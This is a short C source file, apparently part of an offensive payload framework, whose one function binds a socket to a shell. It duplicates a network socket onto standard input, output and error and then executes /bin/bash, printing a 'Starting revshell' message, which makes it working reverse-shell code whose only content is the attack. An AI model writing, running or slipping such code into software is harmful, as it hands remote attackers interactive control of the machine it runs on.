
#include "payload.h"
#include <netinet/in.h>
#include <unistd.h>

SECTION(ELF_CODE)
void setup_payload(settings_t *g_settings)
{
    char * const argv[] = {"/bin/bash", NULL};

    printf("[+] Starting revshell.\n");
    dup2(g_settings->sockfd, 0);
    dup2(g_settings->sockfd, 1);
    dup2(g_settings->sockfd, 2);
    execve("/bin/bash", argv, environ);
}
